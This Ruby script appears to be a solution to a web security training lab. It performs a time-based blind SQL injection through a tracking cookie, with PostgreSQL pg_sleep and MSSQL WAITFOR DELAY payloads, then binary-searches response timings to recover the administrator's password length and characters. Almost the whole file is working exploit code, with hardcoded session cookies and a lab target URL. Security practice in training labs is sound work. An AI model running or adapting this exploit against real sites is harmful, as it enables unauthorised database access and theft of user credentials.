require_relative '../utils.rb'

SESSION_COOKIE = "Ko9mtggFSvpXO7jf4x0RJuLNEnAZuAl2"
TRACKINGID_COOKIE = "VrmRwIkKfb6eWoEO"
BASE_URI = URI("https://0ab8002f04d385e281884db2006e00ed.web-security-academy.net/")

delay_sql = "'; IF (1=2) WAITFOR DELAY '0:0:10'--" 
delay_sql = "'; IF (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--" 
delay_sql = "' || pg_sleep(10)--" 
base_sql = "' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--"
username_check_sql = "' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--"
password_length_check_sql = "' || (select case when (username='administrator' AND LENGTH(password)>1) then pg_sleep(10) else pg_sleep(-1) end from users)--"
password_char_check_sql = "' || (select case when (username='administrator' AND SUBSTR(password, 1, 1) > m) then pg_sleep(10) else pg_sleep(-1) end from users)--"


def password_length_sql(test_length)
  "' || (select case when (username='administrator' AND LENGTH(password)>#{test_length}) then pg_sleep(3) else pg_sleep(-1) end from users)--"  
end

def char_test_sql(char_no, operator, ascii_code)
  "' || (select case when (username='administrator' AND ASCII(SUBSTR(password, #{char_no}, 1)) #{operator} #{ascii_code}) then pg_sleep(3) else pg_sleep(0) end from users)--"
  # "' || (select case when (username='administrator' AND ASCII(SUBSTR(password, 1, 1)) > 126) then pg_sleep(3) else pg_sleep(0) end from users)--"
end

def password_length(max_length=30)
  (1..max_length).each do |length|
    sql = password_length_sql(length)
    puts "running sql: #{sql}"
    req = built_request(sql, SESSION_COOKIE)
    
    start_time = Time.now
    http_client.request(req)
    duration = Time.now - start_time
    if duration < 2.8
      return length
    else
      puts "password length is > #{length}"
    end
  end
end

def fuzz_password
  password = []
  
  (1..20).each do |char_no|
    password << password_char_at(char_no)
  end

  password.join
end

def password_char_at(char_no, min_ascii=ASCII_MIN, max_ascii=ASCII_MAX)
  if min_ascii == max_ascii
    char = min_ascii.chr(Encoding::ASCII)
    puts "char at position #{char_no} is ASCII; #{min_ascii} and letter; #{char}"
    return char
  end

  mid_ascii = (min_ascii + max_ascii) / 2
  
  sql = char_test_sql(char_no, '>', mid_ascii)
  puts "sql being run is; #{sql}"
  req = built_request(sql, SESSION_COOKIE)
  start_time = Time.now
  response = http_client.request(req)
  is_above_mid = (Time.now - start_time) > 2.8

  if is_above_mid
    puts "is above mid; #{mid_ascii}"
    password_char_at(char_no, mid_ascii + 1, max_ascii)
  else
    puts "is not above mid; #{mid_ascii}"
    password_char_at(char_no, min_ascii, mid_ascii)
  end
end

puts fuzz_password